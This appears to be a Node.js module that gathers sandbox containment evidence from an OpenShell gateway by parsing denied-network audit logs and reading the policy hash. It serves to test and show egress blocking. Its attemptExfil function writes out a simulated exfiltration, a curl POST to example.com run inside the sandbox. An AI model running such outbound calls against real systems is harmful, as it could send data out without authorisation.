import { spawn } from "node:child_process";

// Pulls containment evidence straight from the OpenShell gateway: the OCSF
// NET:OPEN DENIED audit lines the sandbox emits, plus the effective policy
// hash. Nothing here is seeded — if the gateway has no deny line, state is
// UNPROVEN and the frontend says so.

const BIN = process.env.OPENSHELL_BIN || "/home/dell/.local/bin/openshell";
const SANDBOX = process.env.OPENSHELL_SANDBOX || "plant-floor";
const LOG_LINES = 400;

function run(args, { timeoutMs = 15000 } = {}) {
  return new Promise((resolve) => {
    const child = spawn(BIN, args, { stdio: ["ignore", "pipe", "pipe"] });
    let out = "", err = "";
    const timer = setTimeout(() => child.kill("SIGKILL"), timeoutMs);
    child.stdout.on("data", (d) => (out += d));
    child.stderr.on("data", (d) => (err += d));
    child.on("error", (e) => { clearTimeout(timer); resolve({ code: -1, out, err: err || e.message }); });
    child.on("close", (code) => { clearTimeout(timer); resolve({ code, out, err }); });
  });
}

const strip = (s) => s.replace(/\x1b\[[0-9;]*m/g, "");

// [1789237283.731] [sandbox] [OCSF ] [ocsf] NET:OPEN [MED] DENIED /usr/bin/curl(114926) -> example.com:443 [policy:- engine:opa] [reason:endpoint example.com:443 is not allowed by any policy]
const DENY_RE = /^\[(?<epoch>[\d.]+)\]\s+\[(?<source>[^\]]+)\]\s+\[(?<level>[^\]]+)\]\s+\[(?<logger>[^\]]+)\]\s+(?<activity>\S+)\s+\[(?<severity>[^\]]+)\]\s+DENIED\s+(?<process>\S+?)\((?<pid>\d+)\)\s+->\s+(?<dest>\S+)\s+\[policy:(?<policy>[^\s\]]*)\s+engine:(?<engine>[^\]]+)\]\s*(?:\[reason:(?<reason>[^\]]*)\])?/;

export function parseDenyLine(raw) {
  const line = strip(raw).trim();
  if (!/\bDENIED\b/.test(line)) return null;
  const m = DENY_RE.exec(line);
  if (!m) return { ts: null, raw: line, process: null, pid: null, dest: null, activity: null, severity: null, policy: null, engine: null, reason: null };
  const g = m.groups;
  return {
    ts: new Date(Number(g.epoch) * 1000).toISOString(),
    raw: line,
    process: g.process, pid: Number(g.pid), dest: g.dest,
    activity: g.activity, severity: g.severity,
    policy: g.policy === "-" ? null : g.policy, engine: g.engine,
    reason: g.reason ?? null,
  };
}

export async function denyAudit({ sandbox = SANDBOX, since = "24h", lines = LOG_LINES } = {}) {
  const { code, out, err } = await run(["logs", sandbox, "--since", since, "--source", "sandbox", "-n", String(lines)]);
  if (code !== 0) return { ok: false, error: strip(err || out).trim().split("\n").pop() || `openshell logs exit ${code}`, denies: [] };
  const denies = out.split("\n").map(parseDenyLine).filter(Boolean);
  return { ok: true, denies, truncated: /log buffer contains only/.test(err) };
}

export async function policy({ sandbox = SANDBOX } = {}) {
  const { code, out, err } = await run(["policy", "get", sandbox]);
  if (code !== 0) return { ok: false, error: strip(err || out).trim().split("\n").pop() || `openshell policy exit ${code}` };
  const kv = {};
  for (const line of strip(out).split("\n")) { const m = /^([A-Za-z ]+):\s+(.*)$/.exec(line.trim()); if (m) kv[m[1].trim().toLowerCase().replace(/\s+/g, "_")] = m[2].trim(); }
  return { ok: true, version: kv.version ? Number(kv.version) : null, hash: kv.hash || null, status: kv.status || null, source: kv.source || null, config_rev: kv.config_rev || null };
}

// Runs the deny demo inside the sandbox: a POST to a non-allowlisted host.
export async function attemptExfil({ sandbox = SANDBOX, url = "https://example.com/telemetry" } = {}) {
  const started = new Date().toISOString();
  const { code, err } = await run(["sandbox", "exec", "-n", sandbox, "--", "/usr/bin/curl", "-fsS", "-X", "POST", "--max-time", "5", url], { timeoutMs: 20000 });
  return { started, url, exit: code, denied: code !== 0, stderr: strip(err).trim().split("\n").pop() || `exit ${code}` };
}

export async function containmentEvidence({ sandbox = SANDBOX, since = "24h" } = {}) {
  const [audit, pol] = await Promise.all([denyAudit({ sandbox, since }), policy({ sandbox })]);
  const denies = audit.denies.slice(-25);
  const last = denies.at(-1) || null;
  return {
    state: denies.length ? "CONTAINED" : "UNPROVEN",
    sandbox, inference: "inference.local",
    fetched_at: new Date().toISOString(),
    source: `openshell logs ${sandbox} --source sandbox`,
    policy: pol.ok ? { version: pol.version, hash: pol.hash, status: pol.status, source: pol.source } : { error: pol.error },
    deny_count: denies.length,
    last_deny: last ? last.raw : null,
    denies,
    errors: [audit.ok ? null : audit.error].filter(Boolean),
  };
}
